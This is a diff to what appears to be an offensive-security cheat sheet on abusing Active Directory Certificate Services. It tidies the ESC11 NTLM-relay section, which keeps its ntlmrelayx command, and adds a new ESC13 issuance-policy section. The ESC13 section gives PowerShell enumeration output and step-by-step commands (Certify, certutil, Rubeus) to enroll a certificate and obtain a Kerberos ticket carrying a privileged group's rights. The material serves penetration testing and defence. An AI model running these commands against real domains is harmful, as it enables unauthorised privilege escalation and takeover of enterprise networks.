@@ -301,18 +301,72 @@ Jane@corp.local is allowed to enroll in the certificate template ESC9 that speci
 
 ## ESC11 - Relaying NTLM to ICPR
 
-> Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+> Encryption is not enforced for ICPR requests and Request Disposition is set to Issue.
 
 Requirements:
+
 * [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy fork
 * [sploutchy/impacket](https://github.com/sploutchy/impacket) - Impacket fork
 
 Exploitation:
+
 1. Look for `Enforce Encryption for Requests: Disabled` in `certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout` output
 2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.
     ```ps1
     ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
     ```
+
+
+## ESC13 - Issuance Policy
+
+> If a principal (user or computer) has enrollment rights on a certificate template configured with an issuance policy that has an OID group link, then this principal can enroll a certificate that allows obtaining access to the environment as a member of the group specified in the OID group link.
+
+**Requirements**
+
+* The principal has enrollment rights on a certificate template
+* The certificate template has an issuance policy extension
+* The issuance policy has an OID group link to a group
+* The certificate template defines EKUs that enable client authentication
+
+```ps1
+PS C:\> $ESC13Template = Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties nTSecurityDescriptor $ESC13Template.nTSecurityDescriptor.Access | ? {$_.IdentityReference -eq "DUMPSTER\ESC13User"}
+AccessControlType     : Allow
+
+# check if there is an issuance policy in the msPKI-Certificate-Policy
+PS C:\> Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties msPKI-Certificate-Policy
+msPKI-Certificate-Policy : {1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.3651508.12319448}
+
+# check for OID group link
+PS C:\> Get-ADObject "CN=12319448.2C2B96A74878E00434BEDD82A61861C5,$OIDContainer" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink
+msDS-OIDToGroupLink     : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire
+
+# verify if ESC13Group is a Universal group
+PS C:\> Get-ADGroup ESC13Group -Properties Members
+GroupScope        : Universal
+Members           : {}
+```
+
+**Exploitation**:
+
+* Request a certificate for the vulnerable template
+  ```ps1
+  PS C:\> .\Certify.exe request /ca:DC01\dumpster-DC01-CA /template:ESC13Template
+  ```
+
+* Merge into a PFX file
+  ```ps1
+  PS C:\> certutil -MergePFX .\esc13.pem .\esc13.pfx
+  ```
+
+* Verify the presence of the "Client Authentication" and the "Policy Identifier"
+  ```ps1
+  PS C:\> certutil -Dump -v .\esc13.pfx
+  ```
+
+* Ask a TGT for our user, but we are also member of the linked group and inherited their privileges
+  ```ps1
+  PS C:\> .\Rubeus.exe asktgt /user:ESC13User /certificate:C:\esc13.pfx /nowrap
+  ```
 
 
 ## Certifried CVE-2022-26923
@@ -429,3 +483,4 @@ Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User vi
 * [CA configuration - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration)
 * [Access controls - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls)
 * [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)
+* [ADCS ESC13 Abuse Technique - Jonas Bülow Knudsen - 02/15/2024](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
